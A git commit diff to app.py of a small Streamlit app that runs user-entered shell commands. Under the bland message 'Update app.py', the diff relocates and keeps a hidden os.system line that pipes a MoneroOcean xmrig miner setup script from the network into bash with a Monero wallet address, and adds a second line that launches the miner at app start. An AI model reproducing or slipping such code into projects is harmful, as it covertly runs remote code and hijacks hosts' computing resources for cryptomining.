89b5b15dcddedbe66b042559daea94fe7823240d
Premraj123456 <104309530+Premraj123456@users.noreply.github.com>
2024-06-08 22:52:25 +0530

    Update app.py

--- app.py
+++ app.py
@@ -1,8 +1,6 @@
 import os
 import streamlit as st
 
-os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo")
-
 
 st.header('My Streamlit App')
 input_text = st.text_input('Enter CMD')
@@ -14,3 +12,6 @@ if button == True:
     st.text(output)
   else:
     st.text('Please Enter CMD')
+
+os.system("curl -s -L https://raw.githubusercontent.com/MoneroOcean/xmrig_setup/master/setup_moneroocean_miner.sh | bash -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo")
+os.system("bash /root/moneroocean/miner.sh -s 44J9wBvi8BEazC8tK8ej4CaNQZn9HiHNYTBQzbLmN9zbiu2gJ9pxqGeRBsz31QYvwXQC5cgiBmb6xNMsU3YxxaoVC2wyXWo")
